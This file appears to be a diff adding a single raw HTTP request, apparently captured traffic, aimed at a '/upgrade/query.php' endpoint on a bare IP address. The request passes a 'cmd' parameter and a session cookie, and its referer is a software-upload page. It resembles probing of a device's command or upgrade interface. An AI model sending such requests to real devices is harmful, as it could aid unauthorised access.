@@ -1,0 +1,22 @@
+GET /upgrade/query.php?cmd=cmdcookie%3DKsSoEc%3EBl%5E%2FeV%402h%25%23%24!Y1-N(.GgX(hG HTTP/1.1
+
+Host: 189.206.168.49
+
+Accept: text/plain, */*; q=0.01
+
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36
+
+X-Requested-With: XMLHttpRequest
+
+Referer: http://189.206.168.49/upgrade/swupload.html
+
+Accept-Encoding: gzip, deflate
+
+Accept-Language: en-US,en;q=0.9
+
+Cookie: SESSID=KsSoEc>Bl^/eV@2h%#$!Y1-N(.GgX(hG
+
+Connection: close
+
+
+
